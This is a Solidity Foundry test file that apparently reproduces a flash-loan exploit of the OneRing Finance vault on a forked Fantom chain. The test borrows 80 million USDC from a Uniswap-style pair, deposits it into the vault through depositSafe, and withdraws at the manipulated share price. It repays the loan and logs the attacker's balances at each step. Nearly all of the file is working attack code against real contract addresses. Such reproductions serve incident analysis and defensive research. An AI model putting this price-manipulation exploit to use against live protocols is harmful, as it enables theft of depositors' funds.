// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface IOneRingVault is IERC20 {
    function depositSafe(uint256 _amount, address _token, uint256 _minAmount) external;

    function withdraw(uint256 _amount, address _underlying) external;

    function balanceOf(address account) external view returns (uint256);

    function activeStrategy() external view returns (address);

    function getSharePrice() external view returns (uint256);
}

interface IStrategy {
    function unsalvagableTokens(address tokens) external view returns (bool);

    function underlying() external view returns (address);

    function vault() external view returns (address);

    function withdrawAllToVault() external;

    function withdrawToVault(uint256 amount) external;

    function investAllUnderlying() external;

    function investedBalance() external view returns (uint256); // itsNotMuch()

    function strategyEnabled(address) external view returns (bool);

    // should only be called by controller
    function salvage(
        address recipient,
        address token,
        uint256 amount
    ) external;

    function doHardWork() external;

    function harvest(uint256 _denom, address sender) external;

    function depositArbCheck() external view returns (bool);

    // new functions
    function investedBalanceInUSD() external view returns (uint256);

    function withdrawAllToVault(address _underlying) external;

    function withdrawToVault(uint256 _amount, address _underlying) external;

    function assetToUnderlying(address _asset) external returns (uint256);

    function getUSDBalanceFromUnderlyingBalance(uint256 _bal)
        external
        view
        returns (uint256 _amount);
}

contract ContractTest is DSTest {
    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 mim = IERC20(0x82f0B8B456c1A451378467398982d4834b6829c1);
    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    IStrategy strategy = IStrategy(0x8b12522260d4eC64B93A7b087b084437BF9927EE);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("fantom", 34_041_499); //fork fantom at block 34041499

        cheats.label(address(pair), "pair");
        cheats.label(address(mim), "mim");
        cheats.label(address(usdc), "usdc");
        cheats.label(address(vault), "vault");
        cheats.label(address(strategy), "strategy");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker usdc balance",
            usdc.balanceOf(address(this)),
            usdc.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker vault balance",
            vault.balanceOf(address(this)),
            vault.decimals()
        );
        emit log_named_decimal_uint(
            "Pair usdc balance",
            usdc.balanceOf(address(pair)),
            usdc.decimals()
        );
        emit log_named_decimal_uint(
            "Pair vault balance",
            vault.balanceOf(address(pair)),
            vault.decimals()
        );
        emit log_named_decimal_uint(
            "Vault usdc balance",
            usdc.balanceOf(address(vault)),
            usdc.decimals()
        );
        emit log_named_decimal_uint(
            "Vault vault balance",
            vault.balanceOf(address(vault)),
            vault.decimals()
        );
        emit log_named_decimal_uint(
            "Vault pair balance",
            pair.balanceOf(address(vault)),
            pair.decimals()
        );
        emit log_named_decimal_uint(
            "Strategy usdc balance",
            usdc.balanceOf(address(strategy)),
            usdc.decimals()
        );
        emit log_named_decimal_uint(
            "Strategy vault balance",
            vault.balanceOf(address(strategy)),
            vault.decimals()
        );
        emit log_named_decimal_uint(
            "Strategy pair balance",
            pair.balanceOf(address(strategy)),
            pair.decimals()
        );

        // Other stuff
        emit log_named_uint(
            "Vault get shares",
            vault.getSharePrice()
        );
        emit log_named_uint(
            "Strategy investedBalanceInUSD",
            strategy.investedBalanceInUSD()
        );
        emit log_named_uint(
            "Strategy assetToUnderlying",
            strategy.assetToUnderlying(address(usdc))
        );
        emit log_named_uint(
            "Pair totalSupply",
            pair.totalSupply()
        );
        emit log_named_uint(
            "Vault totalSupply",
            vault.totalSupply()
        );
        emit log_string("");
    }

    function testExploit() public {
        emit log_named_address("Strategy", vault.activeStrategy());
        print("Before exploit");
        pair.swap(80_000_000 * 1e6, 0, address(this), new bytes(1));
        print("After exploit");
    }

    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        usdc.approve(address(vault), type(uint256).max);
        print("After flashloan");
        vault.depositSafe(amount0, address(usdc), 1);
        print("After deposit");
        vault.withdraw(vault.balanceOf(address(this)), address(usdc));
        print("After withdraw");
        usdc.transfer(address(pair), amount0 * 1003 / 1000);
    }
}
